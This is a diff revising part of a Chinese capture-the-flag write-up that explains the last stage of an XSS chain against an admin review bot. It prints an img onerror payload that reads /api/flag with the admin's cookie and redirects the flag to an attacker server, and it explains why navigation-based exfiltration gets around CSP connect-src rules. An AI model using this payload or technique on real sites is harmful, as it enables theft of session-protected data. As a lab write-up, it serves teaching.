@@ -1179,9 +1179,9 @@ function policy(req) {
 
 ### 2.11 渲染与外传
 
-一句话：检查全部通过后，服务器把笔记 HTML 原样渲染进响应；其中的 XSS 以管理员身份读走 flag。
+一句话：检查全部通过后，服务器的 `/reports/check` 接口把笔记 HTML 原样渲染进响应；其中的 XSS 以管理员身份读取 flag，并发送给攻击者服务器。
 
-回退（2.10）触发的这次请求通过了渲染分支的全部检查：
+2.10 里 `history.go(-10)` 触发的那次请求，就是对审查页 `/reports/check` 的第二次访问，这次请求通过了渲染分支的全部检查（下面这行日志就是各项检查的结果）：
 
 ```text
 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
@@ -1193,17 +1193,17 @@ function policy(req) {
 <img src=q onerror='fetch("/api/flag").then(r=>r.text()).then(t=>location="//host.docker.internal:9975/f?"+t)'>
 ```
 
-（就是 2.2/2.3 创建的那条 payload。）
-
-执行细节：
+这就是 2.2/2.3 创建的那条 payload，执行细节：
 
 1. `img` 的地址 `q` 不存在，加载失败触发 `onerror`（服务端日志里能看到 `GET /reports/q` 返回 404，证明笔记 HTML 被真正解析进页面并执行了）。
-2. `fetch("/api/flag")` 是同源请求，自动携带管理员的 `sid` cookie；flag 早在机器人访问 `/api/flag` 时就被写进了本轮审查记录（`currentReview.flag`），所以服务器直接返回。
-3. 收到响应后，用 `location` 跳转到攻击者服务器，把结果放在查询串里发送出去。为什么用页面跳转而不是 `fetch` 上传？两个原因：跳转不涉及跨域读取与 CORS（Cross-Origin Resource Sharing，跨源资源共享：浏览器允许跨源读取响应的一套规则）；并且顶层导航不受 CSP 的"获取指令"管辖（`fetch` 会受 `connect-src` 类规则约束），在带 CSP 的页面里更稳。本例的渲染页本身没有 CSP，两条路都通；跳转的字节开销也最小。
+2. `fetch("/api/flag")` 是同源请求，自动携带管理员的 `sid` cookie；服务器核对"管理员会话 + 本轮审查还在进行"后就返回 flag。它不依赖机器人之前读过一次：处理逻辑是"没写过就顺手写进本轮审查记录"（`if (!currentReview.flag) currentReview.flag = FLAG;`），这次读取自己也会触发写入。
+3. 收到响应后，用 `location` 跳转到攻击者服务器，把结果放在查询串里发送出去。为什么用页面跳转而不是 `fetch` 上传？注意 CORS（Cross-Origin Resource Sharing，跨源资源共享：浏览器允许跨源读取响应的一套规则）并不是原因：它拦的是"读响应"，不是"发请求"；像这里这种简单 GET，跨源 `fetch` 照样会发出去、flag 照样能到攻击者服务器（只有"非简单请求"要先过预检，预检不过时正式请求才不发；单向外传本来就不需要读响应）。真正区分两者的是 **CSP**：`fetch` 受 `connect-src` 类"获取指令"管辖，页面带 CSP 时会被直接拦截；顶层导航不受这类指令管辖（`navigate-to` 浏览器基本未实现），在带 CSP 的页面里更稳。本例的渲染页没有 CSP，两条路都通；选跳转是因为它不受 CSP 影响、不涉及 CORS、也不用处理响应，字节开销也最小。
 
 攻击者服务器收到形如 `/f?{"flag":"..."}` 的请求，取出 flag。
 
-### 2.12 整条链的时序全览
+**补充：什么叫"非简单请求"**。同时满足下面所有条件的请求才是"简单请求"，浏览器不做预检、直接发出：① 方法只能是 `GET`、`HEAD`、`POST`；② 只能带白名单请求头（`Accept`、`Accept-Language`、`Content-Language`、`Content-Type`、`Range`），带其他头（例如 `X-Test`）就不算；③ `Content-Type` 只能是 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`；④ `Range` 只允许单个范围（细节略）。不满足其中任何一条，就是"非简单请求"：浏览器先发 `OPTIONS` 预检，服务器不点头（响应里缺 `Access-Control-Allow-*`）时，正式请求不会发出。之所以这么分：简单请求恰好是"老式 HTML 表单也能发出来的请求"，服务器早就得处理；带自定义头、其他方法、JSON 体这些"脚本才有的请求"，必须先得到服务器同意。
+
+### 2.12 攻击链时序总结
 
 | 时刻 | 主体 | 动作 | 服务端状态变化 |
 |---|---|---|---|
@@ -1212,15 +1212,17 @@ function policy(req) {
 | T+1s | 机器人 | 访问 `/api/flag` | `flag` 写入内存 |
 | T+1s | 机器人 | 调用 `/reports/arm` | `prepared=true` |
 | T+1s | 机器人 | 打开 stage1（自动附加 rid） |  |
-| T+1s | stage1 | 弹窗打开审查界面，攻击脚本登记为待审查文档 | `document` 写入 |
+| T+1s | stage1 | 弹窗打开审查界面，攻击脚本登记为待审查文档 | `document` 写入（待审查文档：攻击脚本地址 + 沙箱页 nonce） |
 | T+1s | 审查界面 | 沙箱 iframe 加载攻击脚本 |  |
-| T+2s | 攻击脚本 | iframe 被替换的瞬间（pagehide）投递消息 |  |
+| T+2s | 审查界面内的攻击脚本 | iframe 被替换的瞬间（pagehide）投递消息 |  |
 | T+2s | 审查界面 | 调用 `/complete` | `approved=true` |
 | T+4.5s | stage1 | 开始连续 8 次自导航 |  |
 | T+5.5s | stage1 | `history.go(-10)` 回退到审查页 |  |
 | T+5.5s | 机器人 | 审查页被真实重新请求，全部检查通过 | `used=true`，渲染笔记原文 |
 | T+5.5s | 渲染出的页面上的 XSS 代码 | 读 `/api/flag`，跳转攻击者服务器 | flag 外传 |
 | T+11s | 机器人 | 10 秒停留结束，关闭浏览器 | 本轮审查记录清空 |
+
+> 注意：T+1s 的"`flag` 写入内存"对攻击链不是必要条件。`/api/flag` 的逻辑是"没写过就顺手写"（`if (!currentReview.flag) currentReview.flag = FLAG;`），最后 XSS 那次读取自己也会触发写入、返回同一个 `FLAG`；这次访问对链路的真正贡献是历史记录（`history.go(-10)` 的步数把它算进去了）。
 
 > 本章小结：只靠机器人的固定流程，审查渲染分支永远不会被触发（它只访问审查页一次）。要让笔记原文被渲染出来，攻击者必须自己安排"第二次访问"，并让 2.6 检查表里的每一项都通过。
 
